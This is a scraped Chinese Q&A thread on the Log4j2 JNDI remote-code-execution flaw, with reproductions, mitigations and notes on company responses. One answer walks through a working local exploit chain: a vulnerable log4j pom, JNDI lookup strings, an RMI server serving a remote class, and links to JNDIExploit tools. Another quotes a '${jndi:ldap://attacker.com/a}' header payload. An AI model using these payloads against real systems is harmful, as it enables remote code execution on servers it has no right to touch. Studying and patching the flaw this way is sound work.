+<li>临时缓解方案。可升级 jdk 版本至 6u211 / 7u201 / 8u191 / 11.0.1 以上，可以在一定程度上限制 JNDI 等漏洞利用方式。对于大于 2.10 版本的 Log4j，可设置 log4j2.formatMsgNoLookups 为 True，或者将 JndiLookup 类从 classpath 中去除，例如 zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</li>
+</ol>
+<h2 id=0x03-漏洞复现><strong>0x03. 漏洞复现</strong></h2>
+<p>以下测试，只做学习分析之用，不要于其他用途！单机演示，所有地址都是 127.0.0.1。</p>
+<p>本来不准备画图的，但是很多同学以为注入漏洞就是简单的运行网上的 ${jndi:ldap://127.0.0.1:1389/Log4jTest} ，我觉得还是有必要画个图简单说明一下， 一个简单的攻击链路步骤图，画的匆忙见谅。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-132b147c50791eb1c5074d1772a24f54_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h3 id=31-环境模拟---受害者小白服务><strong>3.1. 环境模拟 - 受害者小白服务</strong></h3>
+<p>这里删除了，发布后感觉不太好，可能会被有其他心思的人利用，删除了。想了解的你总能找到我。</p>
+<h3 id=32-环境模拟---攻击者httpswwwzhihucomsearchqe694bbe587bbe88085search_sourceentityhybrid_search_sourceentityhybrid_search_extra7b22sourcetype223a22answer222c22sourceid223a22659340807d服务><strong>3.2. 环境模拟 - <a href="https://www.zhihu.com/search?q=%E6%94%BB%E5%87%BB%E8%80%85&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2265934080%7D">攻击者</a>服务</strong></h3>
+<p>这里删除了，发布后感觉不太好，可能会被有其他心思的人利用，删除了。想了解的你总能找到我。</p>
+<h3 id=33-测试><strong>3.3. 测试</strong></h3>
+<p>受害者小白服务再次运行，原本只简单打印一行日志，现在多了一行说明信息。</p>
+<pre tabindex=0><code>无害测试，没有攻击性，linux/mac 创建文本：xxxyyyzzz.txt；windows 弹出计算器。最后求关注，公众号：程序猿阿朗
+20:21:57.780 \[main\] ERROR Log4j2 - params:${jndi:ldap://127.0.0.1:1389/Log4jTest}
+
+</code></pre><p>同时运行项目目录多了一个文件 xxxyyyzzz.txt</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-e46cb0acc41513c6b9c980cc9e802a6e_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>如果你是在 windows 上运行测试，那么会弹出一个计算器。</p>
+<p>一如既往，文章中的代码存放在：<a href="https://link.zhihu.com/?target=https%3A//github.com/niumoo/lab-notes/tree/master/poc-log4j2">github.com/niumoo/lab-notes</a></p>
+<p>&lt;完></p>
+<p>Hello world : ) 我是阿朗，一线技术工具人，认认真真写文章，求个点赞。</p>
+<p>文章持续更新，可以关注公众号「 <a href="https://link.zhihu.com/?target=https%3A//cdn.jsdelivr.net/gh/niumoo/cdn-assets/webinfo/wp.png">程序猿阿朗</a> 」或访问<a href="https://link.zhihu.com/?target=https%3A//www.wdbyte.com/">未读代码博客 (https://www.wdbyte.com)</a> 」。 本文 <a href="https://link.zhihu.com/?target=https%3A//github.com/niumoo/JavaNotes">Github.com/niumoo/JavaNotes</a> 已经收录，有很多知识点和系列文章，欢迎 Star。</p>
+<h3 id=知乎用户-小筑-发表>知乎用户 小筑 发表</h3>
+<p>蹭个热度，发一下今天 log4j 源码编译时我遇到的问题及其解决办法</p>
+<p>** 本贴针对官方在 GitHub 发布的 2.15.0-rc2</p>
+<p># 环境配置</p>
+<p>* 编译器不要使用高版本的 JDK ，环境变量要使用 JDK8</p>
+<p>* JDK8 之外，也要安装有一个版本号大于或等于 9 的 JDK</p>
+<p>* 以上两个 JDK 的路径，可以配置在源码包中的 toolchains-sample-xxx.xml 文件中，也不排除有其他合理的配置方法</p>
+<p># 编译步骤</p>
+<p>* 不要图省事直接在顶层目录下使用 mvn package 进行编译，以 log4j-api 为例。如果直接编译 log4j-api ，会提示远程仓库中不存在 log4j-api-java9 。需要先进入 log4j-api-java9 目录，使用 mvn install -t ..\toolchains-sample-win.xml 将 log4j-api-java9 安装到本地仓库中才能正常编译 log4j-api</p>
+<h3 id=知乎用户-陕西颜值扛把子-发表>知乎用户 陕西颜值扛把子 发表</h3>
+<h2 id=上面好多回答都写得挺清楚了我来写个简单复现吧>上面好多回答都写得挺清楚了，我来写个简单复现吧</h2>
+<h2 id=前情提要>前情提要</h2>
+<p><a href=https://www.zhihu.com/question/504954921>Apache 存在 Log4j 远程代码执行漏洞，将给相关企业带来哪些影响？还有哪些信息值得关注？</a></p>
+<h2 id=构建-maven-项目引入-log4j2>构建 maven 项目引入 Log4j2</h2>
+<h3 id=编写-pom-文件>编写 pom 文件</h3>
+<pre tabindex=0><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;project xmlns=&quot;Maven - Page Not Found&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;Maven - Page Not Found http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;org.example&lt;/groupId&gt;
+    &lt;artifactId&gt;Log4j-rce&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+    &lt;dependencies&gt;
+        &lt;!-- org.apache.logging.log4j &quot; log4j-core --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+            &lt;version&gt;2.13.3&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- org.apache.logging.log4j &quot; log4j-api --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+            &lt;version&gt;2.13.3&lt;/version&gt;
+        &lt;/dependency&gt;
+
+    &lt;/dependencies&gt;
+
+    &lt;properties&gt;
+        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;
+        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;
+    &lt;/properties&gt;
+
+&lt;/project&gt;
+
+</code></pre><h3 id=编写测试代码>编写测试代码</h3>
+<pre tabindex=0><code>import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+
+
+public class log4jRCE {
+    private static final Logger logger = LogManager.getLogger(log4jRCE.class);
+    public static void main(String\[\] args) {
+        // 避免因为Java版本过高而无法触发此漏洞
+        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);
+        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);
+        // 此处ip需要使用本机局域网ip或网络ip，不能使用127.0.0.1
+        logger.error(&quot;${jndi:ldap://ip:1389/Basic/Command/calc}&quot;);
+    }
+}
+
+</code></pre><h2 id=下载-jndi-测试服务器>下载 JNDI 测试服务器</h2>
+<p>到</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a></p>
+<p>或者</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//github.com/welk1n/JNDI-Injection-Exploit">GitHub - welk1n/JNDI-Injection-Exploit: JNDI 注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc）</a></p>
+<p>下载 JNDIExploit 测试服务器</p>
+<p>本次使用 JNDIExploit 举例</p>
+<p>下载完成后使用</p>
+<pre tabindex=0><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ip
+
+</code></pre><p>启动服务器</p>
+<p>然后运行之前的 Log4j2 项目即可出现如图所示效果</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==" alt></p>
+<h2 id=加载运行自己的-class-类>加载运行自己的 class 类</h2>
+<h3 id=编写-rmi-服务器>编写 RMI 服务器</h3>
+<pre tabindex=0><code>import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import javax.naming.Reference;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+/\*\*
+ \* @author Pu Zhiwei {@literal puzhiweipuzhiwei@foxmail.com}
+ \* create          2021-12-11 22:06
+ \*/
+public class RMIServer {
+    public static void main(String\[\] args) {
+        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;,&quot;true&quot;);
+        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);
+        try {
+            LocateRegistry.createRegistry(1099);
+            Registry registry = LocateRegistry.getRegistry();
+
+            System.out.println(&quot;Create RMI registry on port 1099!&quot;);
+            // 前两个参数为类名，第三个参数为远程类地址
+            Reference reference = new Reference(&quot;Test&quot;, &quot;Test&quot;, &quot;http://192.168.0.105:8080/&quot;);
+            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
+            registry.bind(&quot;evil&quot;, referenceWrapper);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
+</code></pre><p>然后编写测试类</p>
+<pre tabindex=0><code>public class Test {
+    static {
+        System.out.println(&quot;你好 Log4j2&quot;);
+    }
+}
+
+</code></pre><p>之后启动一个 http 服务器，将编译好的测试类放入 http 服务器的根目录，这里直接使用 python 的 http 服务器</p>
+<pre tabindex=0><code>python -m http.server 8080
+
+</code></pre><p>修改 Log4j2 项目内容为</p>
+<pre tabindex=0><code>logger.error(&quot;${jndi:rmi://192.168.0.105:1099/evil}&quot;);
+
+</code></pre><p>运行项目即可看到 Test 类已被执行</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-3f81114f91e407ce0377abd62fca4f64_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>之后你就可以通过修改 Test 类实现更多操作。</p>
+<h2 id=如何防范>如何防范</h2>
+<p>彻底解决方案</p>
+<ul>
+<li>升级 Log4j2 到最新版本</li>
+<li>使用最新版 JDK</li>
+</ul>
+<p>临时解决方案：</p>
+<ul>
+<li>设置 jvm 参数 “-Dlog4j2.formatMsgNoLookups=true”</li>
+<li>在项目 classpath 目录下添加 <a href="https://link.zhihu.com/?target=http%3A//log4j2.component.properties/">log4j2.component.properties</a> 配置文件，设置 log4j2.formatMsgNoLookups=true</li>
+</ul>
+<h2 id=end>END</h2>
+<p>本文首发于 <a href="https://link.zhihu.com/?target=https%3A//www.buguagaoshu.com/archives/log4j2yuan-cheng-zhi-xing-lou-dong-fu-xian">令无数程序员加班的 Log4j2 远程执行漏洞复现 | 不挂高数</a></p>
+<p>转载请注明来源</p>
+<h3 id=知乎用户-泡椒学-java-发表>知乎用户 泡椒学 Java​ 发表</h3>
+<p>最近这两天 log4j2 的事情闹得是沸沸扬扬的，本来大叔我是两耳不闻窗外事，一心只敲圣贤码的，谁知，公司研发群的一则通知打破了本来的宁静。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic3.zhimg.com/v2-e5712fd289e245aa9bbbe7dc702a4ada_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>这个时候，我才意识到了问题的严重性，然后我就去各大程序员社区（知乎、CSDN、开源中国等）搜了一下，果然，这件事被大家讨论的沸沸扬扬。</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic1.zhimg.com/v2-6e3da02f48d3d0286c1c8b478de60779_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<p>大叔并没有着急整理这篇文章，而是<strong>让子弹飞一会</strong>。</p>
+<h2 id=漏洞介绍>漏洞介绍</h2>
+<h3 id=apache-log4j2-1>Apache Log4j2</h3>
+<p>Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。</p>
+<h3 id=漏洞原因>漏洞原因</h3>
+<p>本次远程代码执行漏洞正是由于组件存在 Java JNDI 注入漏洞：<strong>当程序将用户输入的数据记录到日志时，攻击者通过构造特殊请求，来触发 Apache Log4j2 中间的远程代码执行漏洞，从而利用此漏洞在目标服务器上执行任意代码</strong>。</p>
+<p><strong>那么什么是 JNDI 呢？</strong></p>
+<p>Java 命名和目录接口（Java Naming and Directory Interface，缩写 JNDI），是 Java 的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p>
+<p>利用下面这段代码，攻击者可以通过 JNDI 来执行 LDAP 协议来注入一些非法的可执行代码。</p>
+<pre tabindex=0><code>public class VulnerableLog4jExampleHandler implements HttpHandler { 
+    static Logger log = Logger.getLogger(log4jExample.class.getName()); 
+    /\*\* \* A simple HTTP endpoint that reads the request's User Agent and logs it back. \* \* This is basically pseudo-code to explain the vulnerability, and not a full example. \* \* @param he HTTP Request Object \*/ 
+    public void handle(HttpExchange he) throws IOException { 
+        String userAgent = he.getRequestHeader(&quot;user-agent&quot;); 
+        // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header. 
+        // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a} log.info(&quot;Request User Agent:&quot; + userAgent); 
+        String response = &quot;Hello There, &quot; + userAgent + &quot;!&quot;; 
+        he.sendResponseHeaders(200, response.length()); 
+        OutputStream os = he.getResponseBody(); 
+        os.write(response.getBytes()); 
+        os.close(); 
+    } 
+}
+
+</code></pre><p>感兴趣的小伙伴可以后台回复 [log4j] 获得具体攻击手段，在本地尝试复现一下，<strong>但是千万不要不当利用哦！</strong></p>
+<h3 id=影响范围-3>影响范围</h3>
+<p><strong>Apache Log4j 2.x &lt;= 2.15.0-rc1（据悉，官方 rc1 补丁有被绕过的风险）</strong></p>
+<h2 id=解决方式>解决方式</h2>
+<p>当问题爆出来之后，大家都在积极修复该漏洞。</p>
+<h3 id=临时性缓解措施任选一种>临时性缓解措施（任选一种）</h3>
+<ul>
+<li>在 jvm 参数中添加 -Dlog4j2.formatMsgNoLookups=true</li>
+<li>系统环境变量中将 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true</li>
+<li>建议 JDK 使用 11.0.1、8u191、7u201、6u211 及以上的高版本</li>
+<li>创建 “log4j2.component.properties” 文件，文件中增加配置 “log4j2.formatMsgNoLookups=true”</li>
+<li>限制受影响应用对外访问互联网</li>
+<li>WAF 添加漏洞攻击代码临时拦截规则。</li>
+</ul>
+<h3 id=永久性解决方案>永久性解决方案</h3>
+<p>截止目前，Log4j2 官网已经发布了 Log4j2 2.15.0 正式版，来解决此次漏洞，大家可以升级到该版本来解决该漏洞。</p>
+<h2 id=八仙过海各显神通>八仙过海，各显神通</h2>
+<p>当问题出现之后，最重要的是先解决问题，咱国内的互联网大厂那可是一刻也没有松懈，全都迅速响应，拿出了自己的解决方案。</p>
+<h3 id=美团-1>美团</h3>
+<p>org.apache.logging.log4j:log4j-core 在 2.10.0 以上增加了不启用 lookup 的配置项，但是默认关闭，官方暂无提供默认开启的正式版本。</p>
+<p>美团日志框架（xmd-log4j2）封装了 log4j2，在 1.4.1 将开关默认打开，防御上面的攻击场景。</p>
+<p>美团内大部分业务使用 xmd-log4j2 ， xmd-log4j2 会引入 log4j2，故使用 com.meituan.inf:xmd-log4j2 引入的 org.apache.logging.log4j:log4j-core，需升级 com.meituan.inf:xmd-log4j2 到最新版本（1.4.1）完成修复。注：切勿使用 xmd-log4j2 2.0.0-Snapshot 包，这不是修复包。</p>
+<p>通过 maven 配置更新 xmd-log4j2，使用最新版本（1.4.1），或使用 inf-bom 1.4.14.1。</p>
+<h3 id=阿里-1>阿里</h3>
+<p>使用了 rasp，加了拦截策略。原理算是字节码增强，通过配置的规则，检测到了攻击就进行上报，或者直接抛出异常。这算是个防御手段，按照阿里人的说法，目前是止血。</p>
+<h3 id=字节-1>字节</h3>
+<p>安全部门将对公司全部 Java 服务进行组件扫描与升级，禁止低版本 Log4j 组件在线上运行。</p>
+<p>同时，我们也将开启针对低版本、高风险组件（Log4j2 和 FastJSON）的安全卡点。</p>
+<h3 id=百度>百度</h3>
+<p>百度的我还没找到他们的解决方式，但是我偷偷的试了一下，确实已经解决了</p>
+<p><img src="https://images.weserv.nl/?url=https%3A//pic2.zhimg.com/v2-23a1a06033bdee0640e78684de6c5191_r.jpg%3Fsource%3D1940ef5c" alt></p>
+<h2 id=思考>思考</h2>
+<p>我们是历史的经历者，也是历史的见证者，当出现这样足以被载入史册的重大事件之后，我们在 “吃瓜” 之余，也要有一些自己的思考。</p>
+<p>不仅仅是 Apache Log4j 2 组件，而是只要有数据和代码未曾分离的地方，全都是注入攻击的可寻之地。</p>
+<p>因此我们在平时写代码的时候要严防各种注入，最常见的应该就是 SQL 注入了。</p>
+<p>但是，我们也不要因噎废食，弃之不用。攻击检测和漏洞修复的工作，有很多研究机构和安全公司都在进行。历史是螺旋上升的，安全也是，前进性、曲折性和周期性不可避免。</p>
+<p><a href="https://www.zhihu.com/search?q=%E7%8E%8B%E5%9D%9A&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266848554%7D">王坚</a>博士曾说：安全是互联网公司的生命，也是每一位网民的最基本需求。</p>
+<p>最后我们为大家准备了由阿里知名白帽子道哥编写的《白帽子讲 Web 安全》，毕竟知己知彼百战百胜，感兴趣的朋友可以学习一下哦~</p>
+<p><a href="https://link.zhihu.com/?target=https%3A//shimo.im/docs/Wfc7bjPOU4IyMp6Y/">石墨文档</a></p>
+<p>​</p>
+<h3 id=知乎用户-架构师-发表>知乎用户 架构师​​ 发表</h3>
+<p>这个事情，需要程序员紧急修复，据说有好多 java 开发者半夜被拉到公司去修改代码，企业需要把损失降低到最小</p>
+<h3 id=1漏洞简介><strong>1、漏洞简介</strong></h3>
+<p>Apache Log4j 2 是一款优秀的 Java 日志框架。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于 Apache Log4j 2 某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p>
+<h3 id=2漏洞危害><strong>2、漏洞危害</strong></h3>
+<p>漏洞利用无需特殊配置，攻击者可直接构造恶意请求，触发远程代码执行漏洞。</p>
+<h3 id=3漏洞编号><strong>3、漏洞编号</strong></h3>
+<p>暂无</p>
+<h3 id=4影响范围><strong>4、影响范围</strong></h3>
+<p><strong>Apache Log4j 2.x &lt;= 2.14.1</strong></p>
+<h3 id=5修复措施><strong>5、修复措施</strong></h3>
+<p>建议排查 Java 应用是否引入 log4j-api , <a href="https://www.zhihu.com/search?q=log4j-core&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A2266238265%7D">log4j-core</a> 两个 jar，若存在使用，极大可能会受到影响，强烈建议受影响用户尽快进行防护 。</p>
+<ol>
+<li>
+<p>升级 Apache Log4j 2 所有相关应用到最新的 log4j-2.15.0-rc2 版本，地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/apache/logginglog4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logginglog4j2/releases/tag/log4j-2.15.0-rc2</a></p>
+</li>
+<li>
+<p>升级已知受影响的应用及组件，如：</p>
+</li>
+<li>
+<p><strong>spring-boot-strater-log4j2</strong></p>
+</li>
+<li>
+<p>Apache Solr</p>
+</li>
+<li>
+<p>Apache Flink</p>
+</li>
+<li>
+<p>Apache Druid</p>
+</li>
+</ol>
+<p>**6、紧急缓解措施：**如果还来不及更新版本修复，可通过下面的方法紧急缓解问题</p>
+<p>（1） 修改 jvm 参数 <strong>-Dlog4j2.formatMsgNoLookups=true</strong></p>
+<p>（2） 修改配置：<strong>log4j2.formatMsgNoLookups=True</strong></p>
+<p>（3） 将系统环境变量 <strong>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</strong> 设置为 true</p>
+<h3 id=知乎用户--中国红脖子青年-发表>知乎用户 中国红脖子青年 发表</h3>
+<p>java 程序员还在加班，其他程序员欢声笑语在</p>
+<p>水群，b 乎回答这个问题。</p>
+<p>jvm 真是好东西</p>
+<h5> <a href="https://www.digitalocean.com/?refcode=4351d40e44b2&utm_campaign=Referral_Invite&utm_medium=Referral_Program&utm_source=CopyPaste">最简单好用的 VPS,没有之一，注册立得 100 美金</a></h5>
+</div>
+<div class="col-lg-8 mx-auto block shadow">
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//pin-cong-jing-xuan.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<div class="col-lg-8 mx-auto block shadow">
+<h3>See Also</h3>
+<div class=container>
+<div class=row>
+<div class="mx-auto px-0">
+<div class="bg-white shadow block">
+<article class=mb-5>
+<h2 class=h5><a class=text-dark href="https://project-gutenberg.github.io/Pincong/post/fed855a2e844edd19b205b1d83a60790/?utm_source=see_also&utm_medium=apache-%25E5%25AD%2598%25E5%259C%25A8-log4j-%25E8%25BF%259C%25E7%25A8%258B%25E4%25BB%25A3%25E7%25A0%2581%25E6%2589%25A7%25E8%25A1%258C%25E6%25BC%258F%25E6%25B4%259E%25E5%25B0%2586%25E7%25BB%2599%25E7%259B%25B8%25E5%2585%25B3%25E4%25BC%2581%25E4%25B8%259A%25E5%25B8%25A6%25E6%259D%25A5%25E5%2593%25AA%25E4%25BA%259B%25E5%25BD%25B1%25E5%2593%258D%25E8%25BF%2598%25E6%259C%2589%25E5%2593%25AA%25E4%25BA%259B%25E4%25BF%25A1%25E6%2581%25AF%25E5%2580%25BC%25E5%25BE%2597%25E5%2585%25B3%25E6%25B3%25A8">互联网大厂程序员梦醒时分</a>
+</h2>
+<p class=text-dark>梦醒之后，每个人对于这份职业的未来、互联网行业的未来，以及更重要的，自己的未来都有了更现实的判断。
+文 | 祝颖丽
+编辑 | 黄俊杰
+一个生于 1986 年的人，他所走过的前半生：
+从出生起，他就经常踩到最剧烈的技术与社会变迁的节 …</p>
+</article>
+<article class=mb-5>
+<h2 class=h5><a class=text-dark href="https://project-gutenberg.github.io/Pincong/post/f07d4c28a96f5005be07b029c82086c4/?utm_source=see_also&utm_medium=apache-%25E5%25AD%2598%25E5%259C%25A8-log4j-%25E8%25BF%259C%25E7%25A8%258B%25E4%25BB%25A3%25E7%25A0%2581%25E6%2589%25A7%25E8%25A1%258C%25E6%25BC%258F%25E6%25B4%259E%25E5%25B0%2586%25E7%25BB%2599%25E7%259B%25B8%25E5%2585%25B3%25E4%25BC%2581%25E4%25B8%259A%25E5%25B8%25A6%25E6%259D%25A5%25E5%2593%25AA%25E4%25BA%259B%25E5%25BD%25B1%25E5%2593%258D%25E8%25BF%2598%25E6%259C%2589%25E5%2593%25AA%25E4%25BA%259B%25E4%25BF%25A1%25E6%2581%25AF%25E5%2580%25BC%25E5%25BE%2597%25E5%2585%25B3%25E6%25B3%25A8">国家何时整治程序员的高薪现象？</a>
+</h2>
+<p class=text-dark>知乎用户 穷码农​​ 发表 不是说早就普及九年业务教育了么？
+哦，识字不代表懂道理呀？！
+那你继续。
+难度题主是教培类的嘛？
+不过，这波，还是请题主说出自己的故事吧。
+知乎用户 摸鱼的王同学​​ 发表 互联网的应用领域，是 “高度工业化” …</p>
+</article>
+<article class=mb-5>
+<h2 class=h5><a class=text-dark href="https://project-gutenberg.github.io/Pincong/post/e0accb46de8b3e602f91e6cc921c90a3/?utm_source=see_also&utm_medium=apache-%25E5%25AD%2598%25E5%259C%25A8-log4j-%25E8%25BF%259C%25E7%25A8%258B%25E4%25BB%25A3%25E7%25A0%2581%25E6%2589%25A7%25E8%25A1%258C%25E6%25BC%258F%25E6%25B4%259E%25E5%25B0%2586%25E7%25BB%2599%25E7%259B%25B8%25E5%2585%25B3%25E4%25BC%2581%25E4%25B8%259A%25E5%25B8%25A6%25E6%259D%25A5%25E5%2593%25AA%25E4%25BA%259B%25E5%25BD%25B1%25E5%2593%258D%25E8%25BF%2598%25E6%259C%2589%25E5%2593%25AA%25E4%25BA%259B%25E4%25BF%25A1%25E6%2581%25AF%25E5%2580%25BC%25E5%25BE%2597%25E5%2585%25B3%25E6%25B3%25A8">华为 Linux 内核贡献者被质疑刷 KPI，真实情况是怎样的？有哪些信息值得关注？</a>
+</h2>
+<p class=text-dark>知乎用户 醉卧沙场​​ 发表 （嫌字多的直接跳到总结部分就好）
+我简单浏览了一下这个开发者的 patch 提交记录，大概在 2017 年以及以前，这个人的 patch 虽然不多，但大部分还是有意义的 patch 的，2018 年好像是在围绕 …</p>
+</article>
+<article class=mb-5>
+<h2 class=h5><a class=text-dark href="https://project-gutenberg.github.io/Pincong/post/8903c442a49c3708253cc8e3776c5262/?utm_source=see_also&utm_medium=apache-%25E5%25AD%2598%25E5%259C%25A8-log4j-%25E8%25BF%259C%25E7%25A8%258B%25E4%25BB%25A3%25E7%25A0%2581%25E6%2589%25A7%25E8%25A1%258C%25E6%25BC%258F%25E6%25B4%259E%25E5%25B0%2586%25E7%25BB%2599%25E7%259B%25B8%25E5%2585%25B3%25E4%25BC%2581%25E4%25B8%259A%25E5%25B8%25A6%25E6%259D%25A5%25E5%2593%25AA%25E4%25BA%259B%25E5%25BD%25B1%25E5%2593%258D%25E8%25BF%2598%25E6%259C%2589%25E5%2593%25AA%25E4%25BA%259B%25E4%25BF%25A1%25E6%2581%25AF%25E5%2580%25BC%25E5%25BE%2597%25E5%2585%25B3%25E6%25B3%25A8">如何看待华为称其对 Linux 贡献全球第一，Linux 内核审核员呼吁华为公司不要刷 KPI ?</a>
+</h2>
+<p class=text-dark>知乎用户 知乎小红旗 发表 一看就明白怎么回事。
+当年，我还是一个刚进华为的萌新。我所在四级部门被分为了七个 LM 团队。
+我所在的 LM 团队，开发任务非常紧。白天提交了代码以后，可能要晚上 9 点才有时间组织代码 review。另外，有 …</p>
+</article>
+<article class=mb-5>
+<h2 class=h5><a class=text-dark href="https://project-gutenberg.github.io/Pincong/post/5b6781e1329d0eea2b9836aa1623cb8f/?utm_source=see_also&utm_medium=apache-%25E5%25AD%2598%25E5%259C%25A8-log4j-%25E8%25BF%259C%25E7%25A8%258B%25E4%25BB%25A3%25E7%25A0%2581%25E6%2589%25A7%25E8%25A1%258C%25E6%25BC%258F%25E6%25B4%259E%25E5%25B0%2586%25E7%25BB%2599%25E7%259B%25B8%25E5%2585%25B3%25E4%25BC%2581%25E4%25B8%259A%25E5%25B8%25A6%25E6%259D%25A5%25E5%2593%25AA%25E4%25BA%259B%25E5%25BD%25B1%25E5%2593%258D%25E8%25BF%2598%25E6%259C%2589%25E5%2593%25AA%25E4%25BA%259B%25E4%25BF%25A1%25E6%2581%25AF%25E5%2580%25BC%25E5%25BE%2597%25E5%2585%25B3%25E6%25B3%25A8">如何看待链家程序员删除财务数据获刑 7 年？</a>
+</h2>
+<p class=text-dark>知乎用户 诗与星空​ 发表 我比较感兴趣的是这句：
+链家公司为恢复数据及重新构建财务系统共计花费人民币 18 万元。
+从这句话看，公司财务数据库大概率没有异地备份。如果有备份的话，恢复系统只是小时级的体力活，不大可能需要 18 万。
+这么看 …</p>
+</article>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<script>var images=document.getElementsByTagName("img"),i;for(i=0;i<images.length;i++)images[i].className+="img-fluid w-100 mb-4"</script>
+<footer class="py-4 bg-light border-top">
+<div class=container>
